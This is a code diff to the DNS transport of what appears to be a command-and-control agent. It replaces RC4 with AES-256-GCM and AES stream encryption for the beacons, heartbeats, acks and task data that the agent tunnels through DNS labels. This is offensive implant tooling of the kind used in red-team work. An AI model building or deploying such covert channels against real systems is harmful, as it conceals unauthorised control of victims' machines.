@@ -809,15 +809,17 @@ BOOL ConnectorDNS::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
     if (!beat || !beatSize || beatSize < 8)
         return FALSE;
 
-    // Extract agent ID from beat
+    // Extract agent ID from beat (beat is AES-GCM encrypted: [IV(12)][CT][Tag(16)])
+    // Decrypt a copy to read the plaintext agent_id at offset 4
     BYTE* beatCopy = (BYTE*)MemAllocLocal(beatSize);
     if (!beatCopy)
         return FALSE;
     memcpy(beatCopy, beat, beatSize);
 
-    EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);
+    int plainLen;
+    DecryptAES256GCM(beatCopy, beatSize, this->encryptKey, &plainLen);
 
-    ULONG agentId = (beatSize >= 8) ? ReadBE32(beatCopy + 4) : 0;
+    ULONG agentId = (plainLen >= 8) ? ReadBE32(beatCopy + 4) : 0;
     MemFreeLocal((LPVOID*)&beatCopy, beatSize);
 
     ApiWin->snprintf(this->sid, sizeof(this->sid), "%08x", agentId);
@@ -951,14 +953,17 @@ void ConnectorDNS::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
             sessionBuf[3] = (BYTE)((plainSize >> 16) & 0xFF);
             sessionBuf[4] = (BYTE)((plainSize >> 24) & 0xFF);
             memcpy(sessionBuf + 5, payload, payloadLen);
-            EncryptRC4(sessionBuf, (int)sessionLen, sessionKey, 16);
-            sendBuf = sessionBuf;
-            sendLen = sessionLen;
+            int encLen;
+            unsigned char* encData = EncryptAES256GCM(sessionBuf, (int)sessionLen, sessionKey, &encLen);
+            MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
+            sendBuf = encData;
+            sendLen = encLen;
         }
         else {
-            EncryptRC4(plainData, (int)plainSize, sessionKey, 16);
-            sendBuf = plainData;
-            sendLen = plainSize;
+            int encLen;
+            unsigned char* encData = EncryptAES256GCM(plainData, (int)plainSize, sessionKey, &encLen);
+            sendBuf = encData;
+            sendLen = encLen;
         }
 
         this->SendData(sendBuf, sendLen);
@@ -974,8 +979,7 @@ void ConnectorDNS::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
             }
         }
 
-        if (sessionBuf)
-            MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
+        MemFreeLocal((LPVOID*)&sendBuf, sendLen);
 
         if ((flags & 0x1) && payload && payload != plainData)
             MemFreeLocal((LPVOID*)&payload, payloadLen);
@@ -986,7 +990,9 @@ void ConnectorDNS::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 
     // Decrypt received data with session key
     if (this->recvSize > 0 && this->recvData) {
-        DecryptRC4(this->recvData, this->recvSize, sessionKey, 16);
+        int plainLen;
+        DecryptAES256GCM(this->recvData, this->recvSize, sessionKey, &plainLen);
+        this->recvSize = plainLen;
     }
 }
 
@@ -1118,7 +1124,7 @@ void ConnectorDNS::SendHeartbeat()
     ULONG hbNonce = this->functions->GetTickCount() ^ (this->seq * 7919);
     BYTE hbData[kAckDataSize];
     BuildAckData(hbData, this->downAckOffset, hbNonce, this->downTaskNonce);
-    EncryptRC4(hbData, kAckDataSize, this->encryptKey, 16);
+    CryptAES256Stream(hbData, kAckDataSize, this->encryptKey);
 
     CHAR hbLabel[32] = { 0 };
     DnsCodec::Base32Encode(hbData, kAckDataSize, hbLabel, sizeof(hbLabel));
@@ -1172,7 +1178,7 @@ void ConnectorDNS::SendAck()
     ULONG ackNonce = this->functions->GetTickCount() ^ (this->seq * 7919) ^ 0xACEACE;
     BYTE ackData[kAckDataSize];
     BuildAckData(ackData, this->downAckOffset, ackNonce, this->downTaskNonce);
-    EncryptRC4(ackData, kAckDataSize, this->encryptKey, 16);
+    CryptAES256Stream(ackData, kAckDataSize, this->encryptKey);
 
     CHAR ackLabel[32] = { 0 };
     DnsCodec::Base32Encode(ackData, kAckDataSize, ackLabel, sizeof(ackLabel));
@@ -1334,7 +1340,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             WriteBE32(frame + kMetaSize + 4, sendOffset);
             memcpy(frame + kHeaderSize, data + sendOffset, chunk);
 
-            EncryptRC4(frame, frameSize, this->encryptKey, 16);
+            CryptAES256Stream(frame, frameSize, this->encryptKey);
 
             memset(dataLabel, 0, sizeof(dataLabel));
             if (!DnsCodec::BuildDataLabels(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
@@ -1489,7 +1495,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     BYTE reqData[kReqDataSize];
     WriteBE32(reqData, reqOffset);
     WriteBE32(reqData + 4, nonce);
-    EncryptRC4(reqData, kReqDataSize, this->encryptKey, 16);
+    CryptAES256Stream(reqData, kReqDataSize, this->encryptKey);
 
     CHAR reqLabel[24];
     memset(reqLabel, 0, sizeof(reqLabel));
@@ -1520,7 +1526,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             return;
         }
 
-        DecryptRC4(binBuf, binLen, this->encryptKey, 16);
+        CryptAES256Stream(binBuf, binLen, this->encryptKey);
 
         const ULONG headerSize = 8;
         if (binLen > (int)headerSize) {
